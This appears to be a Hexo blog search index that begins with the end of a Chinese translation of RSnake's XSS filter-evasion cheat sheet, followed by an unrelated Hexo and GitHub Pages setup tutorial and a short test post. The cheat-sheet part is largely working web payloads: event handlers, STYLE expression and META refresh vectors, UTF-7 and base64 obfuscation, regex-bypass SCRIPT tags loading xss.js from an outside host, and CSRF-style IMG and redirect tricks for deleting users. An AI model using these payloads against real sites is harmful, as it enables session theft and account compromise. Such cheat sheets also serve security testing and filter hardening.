(用户或攻击者需要移动页面) onMoveEnd() (用户或攻击者需要移动页面) onMoveStart() (用户或攻击者需要移动页面) onOffline() (浏览器从在线模式转换到离线模式时发生) onOnline() (浏览器从离线模式转换到在线模式时发生) onOutOfSync() (interrupt the element’s ability to play its media as defined by the timeline) onPaste() (用户需要去粘贴或是攻击者执行execCommand(“Paste”) 方法) onPause() (当激活元素时间停顿时触发，包括body元素) onPopState() (当用户返回会话历史时触发) onProgress() (当一个flash动画载入时触发) onPropertyChange() (用户或攻击者需要改变一个元素的属性) onReadyStateChange() (用户或攻击者需要改变一个元素的属性) onRedo() (用户执行再执行操作) onRepeat() (the event fires once for each repetition of the timeline, excluding the first full cycle) onReset() (用户或攻击者重置表单) onResize() (用户调整窗口大小，或是攻击者自动触发通过某些代码例如&#x3C;SCRIPT&gt;self.resizeTo(500,400);&#x3C;/SCRIPT&gt;) onResizeEnd() (用户调整窗口大小，或是攻击者自动触发通过某些代码例如&#x3C;SCRIPT&gt;self.resizeTo(500,400);&#x3C;/SCRIPT&gt;) onResizeStart() (用户调整窗口大小，或是攻击者自动触发通过某些代码例如&#x3C;SCRIPT&gt;self.resizeTo(500,400);&#x3C;/SCRIPT&gt;) onResume() (当元素从暂停恢复到激活时触发,包括body元素) onReverse() (if the element has a repeatCount greater than one, this event fires every time the timeline begins to play backward) onRowsEnter() (用户或攻击者需要改变数据源中的一行) onRowExit() (用户或攻击者需要改变数据源中的一行) onRowDelete() (用户或攻击者需要删除数据源中的一行) onRowInserted() (用户或攻击者需要向数据源中插入一行) onScroll() (用户需要滚动,或是攻击者可以执行scrollBy() 函数) onSeek() (媒体播放移动到新位置) onSelect() (用户需要去选择一些文本 - 攻击者可以自动运行利用某些方法例如 window.document.execCommand(“SelectAll”);) onSelectionChange() (用户需要去选择一些文本 - 攻击者可以自动运行利用某些方法例如 window.document.execCommand(“SelectAll”);) onSelectStart() (用户需要去选择一些文本 - 攻击者可以自动运行利用某些方法例如 window.document.execCommand(“SelectAll”);) onStart() (当marquee元素循环开始时触发) onStop() (用户需要点击停止按钮或是离开网页) onStorage() (存储区域改变) onSyncRestored() (user interrupts the element’s ability to play its media as defined by the timeline to fire) onSubmit() (需要攻击者或用户提交表单) onTimeError() (用户或攻击者需要设置一个时间属性例如 dur 的值为无效的值) onTrackChange() (用户或攻击者需要改变播放列表的轨迹) onUndo() (user went backward in undo transaction history) onUnload() (当用户点击一个链接或是按下回车键或是攻击者触发一个点击事件) onURLFlip() (this event fires when an Advanced Streaming Format (ASF) file, played by a HTML+TIME (Timed Interactive Multimedia Extensions) media tag, processes script commands embedded in the ASF file) seekSegmentTime() (this is a method that locates the specified point on the element’s segment time line and begins playing from that point. The segment consists of one repetition of the time line including reverse play using the AUTOREVERSE attribute.) BGSOUND(背景音乐)&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt; &amp; JavaScript 包含&lt;BR SIZE=&quot;&amp;{alert(&apos;XSS&apos;)}&quot;&gt; 样式表&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt; 远程样式表（通过某些方式例如最简单的远程样式表，你可以在表达式类型的样式参数中嵌入xss代码）。它是仅仅工作在IE浏览器或是使用了IE渲染引擎的Netscape 8.1+。需要注意的是页面中并没有展现出它包含了javascript代码。注意：所有的远程样式表xss需要至少页面包含body标签，否则将无法工作。或者页面中包含除了向量本身外的其他内容。因此如果它是一个空白页面，你需要添加至少一个字母到页面确保它可以工作。 &lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://ha.ckers.org/xss.css&quot;&gt; 远程样式表2原理与上面相同。但是使用了STYLE标签代替LINK标签。与此向量稍有不同的变异型曾被用于攻击Google Desktop。你也可以移除&#x3C;/STYLE&gt;标签让后面的html去闭合它。在不允许输入等号或是反斜杠的实际环境中这个向量是有用的。 &lt;STYLE&gt;@import&apos;http://ha.ckers.org/xss.css&apos;;&lt;/STYLE&gt; 远程样式表3它仅仅可以工作在 Opera 8.0 (no longer in 9.x) ，但它是非常的阴险。根据RFC2616规定，设置一个http头不是 HTTP1.1 规定的一部分，但是很多浏览器仍然允许它（例如Firefox and Opera）。这个技巧是我们可以设置一个http头（与常规http头没有什么不同，除了 Link: http://ha.ckers.org/xss.css; REL=stylesheet）。这样带有xss代码的远程向量将运行javascript。它不被支持在 FireFox。 &lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt; 远程样式表4它是仅仅工作在 Gecko 渲染引擎。并且需要绑定一个 XUL文件在页面。令人讽刺的是Netscape认为Gecko是更加安全的，因此绝大多是网站会受到这个攻击。 &lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt; 分隔javascript在STYLE标签这个xss在ie浏览器中会造成无线循环的弹窗 &lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt; STYLE属性中使用注释去分隔表达式提出被 Roman Ivanov &lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&apos;XSS&apos;))&quot;&gt; IMG样式的表达式这是上面xss向量的混合体。不过它展示了STYLE标签被分隔有多困难。同样它也会在ie下造成循环弹窗。 exp/*&lt;A STYLE=&apos;no\xss:noxss(&quot;*//*&quot;); xss:ex/*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt; STYLE标签（仅支持老版本的Netscape）&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt; 使用background-image的style标签&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt; 使用background的style标签&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)}&lt;/STYLE&gt; 匿名html标签的属性IE6.0 和使用了ie渲染引擎的Netscape 8.1+ 并不会关心你创建的html标签存在与否。只要它是以尖括号以及字符开始的。 &lt;XSS STYLE=&quot;xss:expression(alert(&apos;XSS&apos;))&quot;&gt; 本地 htc 文件它有一个小的不同与上面的xss向量，因为他使用的 htc 文件必须是当前域的文件。这个文件通过样式属性引入并运行javascript代码实现xss。 &lt;XSS STYLE=&quot;behavior: url(xss.htc);&quot;&gt; US-ASCII编码US-ASCII 编码 (发现被 Kurt Huwig)。它是使用畸形的ASCII 编码用7bits代替8bits. 这个xss可以绕过绝大多数内容过滤，但是必须当前域的传输形式为 US-ASCII编码方式。或者你自己将当前页面设置为种编码方式 。它是更加有用的去绕过web应用防火墙xss过滤比服务器端的过滤。Apache的 Tomcat是众所周知的 使用US-ASCII编码传输协议。 ¼script¾alert(¢XSS¢)¼/script¾ META关于meta refresh比较奇怪的是它并不会发送一个刷新请求头。因此它通常用于那些不需要引用url的攻击。 &lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;XSS&apos;);&quot;&gt; META using data URL指令方案是非常的不错，因为它没有明显的SCRIPT单词或是JavaScript 指令出现，而是使用了base64 编码。请查看 RFC 2397了解更多信息或是编码你的代码。你也可以使用 XSS calculator去编码你的html或是javascript代码到base64编码。 &lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt; 额外url参数的META如果当前网页试图去查找URL参数是否以”http://“ 开始，你可以用下列技术绕过（被 Moritz Naumann提出） &lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(&apos;XSS&apos;);&quot;&gt; IFRAME如果一个iframes被允许，那么同时可能会存在大量其他xss问题 &lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt; IFRAME 基于事件IFrames或其他元素可以使用事件如下（提出被 David Cross） &lt;IFRAME SRC=# onmouseover=&quot;alert(document.cookie)&quot;&gt;&lt;/IFRAME&gt; FRAMEFrames有一系列像iframes一样的问题 &lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt; TABLE&lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt; TD像上面一样，TD也可以通过 BACKGROUND 来包含javascript xss向量 &lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt; DIV background-image&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt; 使用 unicoded编码xss利用代码在DIV background-image它是被轻微的修改去混淆 url 参数。最早被发现被 Renaud Lifchitz用于攻击hotmail。 附加额外字符在DIV background-imageRnaske开发了一个XSS fuzzer去探测可以在开括号和javascript之间加入哪些额外字符在 IE和安全模式下的 Netscape 8.1。这里都是一些十进制的字符，但是你也可以用十六进制来填充。（下面这些编码字符可以被使用：1-32, 34, 39, 160, 8192-8.13, 12288, 65279） &lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt; DIV expression在冒号和表达式之间添加换行符是一个更加有效的去绕过实际的xss过滤器的表达式变体。 &lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt; html条件选择注释块只能工作在IE5.0 以及更高版或是使用了ie渲染引擎的Netscape 8.1 。 一些网站认为任何包裹在注释中的内容都是安全的，因此它们并不会被移除。这将使我们的xss向量可使用。或者系统可能对某些内容添加注释去试图无害的渲染它。如我们所见，这有时并不起作用。 &lt;!--[if gte IE 4]&gt; &lt;SCRIPT&gt;alert(&apos;XSS&apos;);&lt;/SCRIPT&gt; &lt;![endif]--&gt; BASE标签工作在ie或是使用了安全模块的Netscape 8.1，你需要使用 “//“去避免javascript错误。它需要当前网站使用相对路径（例如images/image.jpg）而非绝对路径。如果路径开始用一个斜杠（例如”/images/image.jpg”），你需要去掉xss向量中的一个斜杠（只有在两个斜杠的情况下才会起到注释作用） &lt;BASE HREF=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt; OBJECT标签如果允许object标签，那么你也可以注入病毒payloads去感染用户。类似于APPLET标签。下面这个链接文件是一个包含xss代码的html文件。 &lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/OBJECT&gt; 使用一个你可以载入包含有xss代码的flash文件的 EMBED 标签点击这个demo，如果你加入属性allowScriptAccess=”never” and allownetworking=”internal”，则可以缓解这个风险（谢谢Jonathan Vanasco 提供的这个信息） &lt;EMBED SRC=&quot;data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==&quot; type=&quot;image/svg+xml&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt; 在flash中使用ActionScript可以混淆你的xss向量a=&quot;get&quot;; b=&quot;URL(\&quot;&quot;; c=&quot;javascript:&quot;; d=&quot;alert(&apos;XSS&apos;);\&quot;)&quot;; eval(a+b+c+d); CDATA混淆的 XML数据岛这个xss向量仅可以在IE 和使用了ie渲染引擎的 Netscape 8.1 下工作。它是 Sec Consult在审计雅虎网站时发现。 &lt;XML SRC=&quot;xsstest.xml&quot; ID=I&gt;&lt;/XML&gt; &lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt; 使用XML数据岛生成含有javascript代码的当前域xml文件它是相同的同上面仅仅代替XML文件为当前域文件。你可以看到结果在下面。 &lt;XML SRC=&quot;xsstest.xml&quot; ID=I&gt;&lt;/XML&gt; &lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt; HTML+TIME 在XML中它展示了 Grey Magic 曾将是怎样攻击 Hotmail 和 Yahoo!的。它是仅仅可以工作在ie和使用了ie渲染引擎的Netscape 8.1。并且这段代码需要放在html与body标签之间。 &lt;HTML&gt;&lt;BODY&gt; &lt;?xml:namespace prefix=&quot;t&quot; ns=&quot;urn:schemas-microsoft-com:time&quot;&gt; &lt;?import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&gt; &lt;t:set attributeName=&quot;innerHTML&quot; to=&quot;XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt; &lt;/BODY&gt;&lt;/HTML&gt; 简单的修改字符去绕过过滤器对 “.js”的过滤在xss向量你可以重命名你的javascript文件为一个图片 &lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt; SSI (服务器端包含)这需要SSI被安装在服务器端去使用这个xss向量。但可能我并不需要提及这点，因为如果你可以运行命令在服务器端，那么毫无疑问会有更加严重的问题存在。 &lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCR&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;IPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt; PHP需要php被安装在服务器端去使用这个xss向量。同样的，如果你可以运行任何远程脚本，那么将会有更加严重的问题。 &lt;? echo(&apos;&lt;SCR)&apos;; echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt; 嵌入命令的IMG它是用于那些需要用户认证后才可以访问的页面，并且在访问这些页面的过程中会执行某些命令。因此它将可以创建或删除用户（如果访问者是管理员），或是寄送某些凭证等等，虽然它是较少被使用但是是非常有用的。 &lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt; 嵌入命令的IMG II这是更加的可怕，因为并没有特别的标识符去鉴别它是否可疑。除非不允许引入第三方域的图片。这个向量是使用一个 302 or 304（或其他可行方案）去重定向一个图片地址为带有某些命令的地址。因此一个正常的图片标签代码&lt;IMG SRC=”a.jpg”&gt;可以是带有命令的xss向量。但是用户看到的仅仅是正常的图片链接地址。下面是一个.htaccess（apche下）配置文件去完成这个向量。（感谢Timo为这部分。） Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser Cookie篡改这是公认的不着边际，但是我已经发下一个例子是用 &lt;META 去覆盖cookie。另一个例子是有些网站使用cookie中的某些数据去呈现在当前访问者的网页中为仅仅他自己而不是从远程数据库中获取。当这两个清静联系在一起的时候，你可以通过修改cookie让javascript输入到用户页面中。（你可以借此让用户退出，改变用户的状态，甚至让用户以你的身份登录） &lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt; UTF-7编码如果存在xss的页面没有包含页面charset header，或是对于任何被设为UTF-7 的浏览器，我们可以利用下面的代码。（感谢Roman Ivanov 的提供），点击这儿为这个例子。（如果页面设置是自动识别编码且content-types 没有被覆盖，在ie浏览器或使用了IE渲染引擎的 Netscape 8.1，则你不需要声明 charset ）在没有改变编码的情况下它是不能工作在任何现代浏览器，这也是为什么它被标记为完全不支持。Watchfire发现这个漏洞在Google的 自定义 404 脚本中. &lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(&apos;XSS&apos;);+ADw-/SCRIPT+AD4- 使用HTML 引用封装的xss它是被测试在ie，具体因情况而异。这个向量是为了绕过那些可以输入 “&lt;SCRIPT&gt;” 但不允许输入 “&lt;SCRIPT SRC…”，通过正则”/&lt;script[^&gt;]+src/i”进行过滤的xss过滤器。 &lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt; 为了执行xss代码在那些允许输入”&lt;SCRIPT&gt;” 但不允许 “&lt;script src…”（通过正则拼配”/&lt;script((\s+\w+(\s=\s(?:”(.)?”|’(.)?’|[^’”&gt;\s]+))?)+\s|\s)src/i”来过滤） 这个是重要的，因为我已经看到这个正则在实际环境中被使用。 &lt;SCRIPT =&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; 另一个逃避相同正则 “/&lt;script((\s+\w+(\s=\s(?:”(.)?”|’(.)?’|[^’”&gt;\s]+))?)+\s|\s)src/i”过滤的xss代码 &lt;SCRIPT a=&quot;&gt;&quot; &apos;&apos; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; 再一个xss例子去绕过相同的过滤器，对于”/&lt;script((\s+\w+(\s=\s(?:”(.)?”|’(.)?’|[^’”&gt;\s]+))?)+\s|\s)src/i”的正则过滤。我知道，我说过我将不会去痛痛快快的聊减灾技术。但是这是我所看到的唯一例子在允许用户输入&lt;SCRIPT&gt;但是不允许通过src加载远程脚本的过滤器。（当然，还有一些其他方法去处理它，如果它们允许&lt;SCRIPT&gt; ） &lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; 最后一个绕过”/&lt;script((\s+\w+(\s=\s(?:”(.)?”|’(.)?’|[^’”&gt;\s]+))?)+\s|\s)src/i”正则匹配的例子，通过重音符。（无法工作在firfox） &lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; 这个xss例子押注于那些并不去拼配一对引号，而是去发现任何引号后就立即结束一个参数字符串的正则过滤器。 &lt;SCRIPT a=&quot;&gt;&apos;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; 这xss仍然让我担心， as it would be nearly impossible to stop this without blocking all active content: &lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; URL 字符串绕过这里假设 “http://www.google.com/“ 这种形式的url在语法上是不被过滤器允许的。 IP代替域名 &lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt; URL 编码 &lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt; 双字节编码（注意：有其他的双字节编码变种。请参考下面混淆后的ip地址为更多信息） &lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt; 十六进制编码The total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit,因为十六进制数字在0-f之间，因此第三位开头的0可以被省略掉。 &lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt; 八进制编码Again padding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc…: &lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt; 混合编码让我们混合基本各种编码并且插入一个tab和换行符。为什么浏览器允许这样，我是不知道。但是它是可以工作当它们被包含在引号之间。 &lt;A HREF=&quot;h tt p://6 6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt; 协议绕过“//”代替“http:// ” 可以节省更多字符。这是非常有用的当输入空间是有限的时候。节省两个字符可能解决大问题。也是容易绕过像”(ht|f)tp(s)?://“ 这样的正则过滤。（感谢 Ozh 提出这部分）。你也可以改变”//“ 为 “\“。你需要保证斜杠在适当的地方。否则可能会被当作一个相对路径的url。 &lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt; Google “feeling lucky” IFirefox 使用 Google的”feeling lucky” 函数去重定向用户输入的任何关键字。因此你可以在可利用页面使用各种关键字针对任何Firefox用户进行攻击。它是使用了”keyword:” 协议。你可以使用多个关键字像这样：XSS+RSnake。它是无法使用在 Firefox as of 2.0。 &lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt; Google “feeling lucky” II这是使用一个小技巧让他工作在Firefox，因为只有Firefox实现了 “feeling lucky” 函数。不像下一个例子，这是无法工作在 Opera ，由于 Opera认为它是一种老的钓鱼攻击。其实它只是一个简单的畸形url。如果你点击弹出框的确定按钮它将工作。但是由于这是一个错误对话框，其实我想说Opera是不支持这种形式的。另外它已经不再被支持在 Firefox 2.0。 &lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt; Google “feeling lucky” III通过畸形url来工作在Firefox 和 Opera浏览器。因为只有它们实现了 “feeling lucky” 函数。像上面的例子一样，它们需要你的网站在谷歌搜索对应关键字时排名第一。（例如google） &lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt; 移除别名结合上面的url。移除 “www.” 将节省四个字符。 &lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt; 绝对 DNS用额外的点 &lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt; JavaScript link location &lt;A HREF=&quot;javascript:document.location=&apos;http://www.google.com/&apos;&quot;&gt;XSS&lt;/A&gt; 针对内容替换的攻击向量这里假设 “http://www.google.com/“ 这种链接会被替换为空。我确实有一个去针对特殊文字过滤的简单的攻击向量。这是一个例子去帮助创建向量。（IE: “java&#x09;script:” 被替换为”java script:”, 它是仍可以工作在 IE和使用安全模块的 Netscape 8.1+ 和 Opera） &lt;A HREF=&quot;http://www.gohttp://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt; 字符编码表最后附上 “&lt;” 在html或是javascript中所有可能的编码形式。它们绝大多数是无法正常被渲染的，但是可以在上文中某些情景下得到渲染。 &lt; %3C &amp;lt &amp;lt; &amp;LT &amp;LT; &amp;#60 &amp;#060 &amp;#0060 &amp;#00060 &amp;#000060 &amp;#0000060 &amp;#60; &amp;#060; &amp;#0060; &amp;#00060; &amp;#000060; &amp;#0000060; &amp;#x3c &amp;#x03c &amp;#x003c &amp;#x0003c &amp;#x00003c &amp;#x000003c &amp;#x3c; &amp;#x03c; &amp;#x003c; &amp;#x0003c; &amp;#x00003c; &amp;#x000003c; &amp;#X3c &amp;#X03c &amp;#X003c &amp;#X0003c &amp;#X00003c &amp;#X000003c &amp;#X3c; &amp;#X03c; &amp;#X003c; &amp;#X0003c; &amp;#X00003c; &amp;#X000003c; &amp;#x3C &amp;#x03C &amp;#x003C &amp;#x0003C &amp;#x00003C &amp;#x000003C &amp;#x3C; &amp;#x03C; &amp;#x003C; &amp;#x0003C; &amp;#x00003C; &amp;#x000003C; &amp;#X3C &amp;#X03C &amp;#X003C &amp;#X0003C &amp;#X00003C &amp;#X000003C &amp;#X3C; &amp;#X03C; &amp;#X003C; &amp;#X0003C; &amp;#X00003C; &amp;#X000003C; \x3c \x3C \u003c \u003C 字符编码和ip混淆器下面网站中包含了对xss有用的各种基本转换器。http://ha.ckers.org/xsscalc.html 作者和主编Robert “RSnake” Hansen 翻译老道( dao#yiye.me )]]></content>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo+GitHub Pages搭建个人博客的一些坑]]></title>
    <url>%2FHexo%2BGitHub%20Pages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91%2F</url>
    <content type="text"><![CDATA[一、前言由于之前使用的都是免费博客，一段时间又不经常更新导致博客已失效。考虑到能够折腾的种种因素，最终跟风的选择了Hexo来搭建博客，共耗时2天。写下此文的目的是为了记录下我搭建过程中解决的一些坑，给需要的同学做个参考。 二、准备工作先说下搭建Hexo的完整流程：1.环境准备2.安装Node.js、Git、Npm、Hexo3.本地调试、预览Hexo、更换主题4.部署至Github Pages 本机环境：Ubuntu 三、系统环境配置1. 安装Git12sudo apt-get install git #安装githubgit --version #显示git版本 2. 安装Node.js12sudo apt-get install nodejs #安装node.jsnodejs -v #显示版本信息 3. 安装Npm（Cnpm）12345sudo apt-get install npm #安装.......npm -v #显示........#由于node不是最新的，node有个模块叫n，是专门用来管理node.js的版本。因此我们安装n模块，然后升级node.js到最新稳定版，否则后导致后续的cnpm安装不成功sudo npm install -g n #安装n模块sudo n stable #升级node.js 由于npm在国内的下载速度极慢（下载Hexo我楞是等待了1个多小时！），在查阅资料后我得知使用淘宝分流的npm安装模块会以肉眼可见的速度在进行着！！，因此后续有关npm的命名都将有cnpm代替。 1sudo npm install cnpm -g --registry=https://registry.npm.taobao.org #安装cnpm 4. 安装Hexo12345678mkdir hexo #创建hexo目录cd hexo sudo cnpm install hexo-cli -g #安装hexohexo init blog #新建博客，Hexo目录下会生产blog文件夹cd blogsudo cnpm install hexo g #生成、编译hexo s #本地预览 这时本地搭建已经完成，可以在本机预览自己的博客了 常用的hexo命令： 1234hexo n "name" #新建文章hexo n page "file" #新建文件夹hexo clean #清理缓存hexo d #部署 5.更换主题可以参照知乎上的一篇文章 有哪些好看的hexo主题-知乎在这儿我使用的是-next在blog目录下输入1sudo git clone https://github.com/iissnan/hexo-theme-next.git theme/next 下载完成后修改blog目录下的_config.yml文件，推荐使用vim12sudo apt-get install vimvim _config.yml 找到theme:landscape 在75行左右将其修改为theme:next 12hexo g #生成、编译hexo s #预览下更换主题后的博客 四、部署Hexo至Git进入GitHub注册账号后新建一个仓库 生成SSH Key12345ssh-keygen -t rsa -C "邮件地址@youremail.com" #一路回车``` ## 添加SSH Key到GitHub```zshcd ~/.ssh #进入保存ssh密钥的目录 找到 id_rsa.pub文件复制文件内容，登陆github 点击右上角的 Settings—&gt;SSH Public keys —&gt; New SSH key —&gt; 粘贴key —&gt; Add SSH key 测试连接1ssh -T git@GitHub.com #不要修改git@GitHub.com yes 回车 成功 ##首次上传文件至github点击右上角 —&gt; Your profile —&gt;你新建的仓库(blog2)在终端输入以下命令12345678git config --global user.email "你的邮箱"git config --global user.name "你的名字"echo "# blog2" &gt;&gt; README.mdgit initgit add README.mdgit commit -m "first commit"git remote add origin git@github.com:GuoKerS/blog2.git #改成你的git push -u origin master 通过hexo d部署至github打开blog目录下的_config.yml1234deploy: type: git repository: git@github.com:GuoKerS/blog2.git ##改成你的 branch: master 保存,在blog目录下输入以下命令1234sudo cnpm install hexo-deployer-git --save #安装所需插件hexo cleanhexo ghexo d 然后找到 setting —&gt; GitHub Pages enter description here 修改成如上图后点击保存（之后绑定域名也将会在这儿设置）部署完成后访问 https://你的id.github.io/blog2 即可 绑定域名添加解析 添加完成后 进入github 点击blog2 找到 setting —&gt; GitHub Pages在Custom domain 出输入你要绑定域名 然后回到终端，我们需要创建CNAME文件才能使得域名成功解析，输入以下命令12345echo "你的域名" &gt;&gt; CNAMEgit initgit add CNAME git commit -m "first commit"git push -u origin master 上传完成，至此你的hexo博客已经初步搭建完成并运行与互联网上了，后续有机会的话将会说一说，hexo的美化，关于如何书写文章，请参照markdown以及baidu]]></content>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Test!]]></title>
    <url>%2FTest%2F</url>
    <content type="text"><![CDATA[Theis’s Guoker.]]></content>
  </entry>
</search>
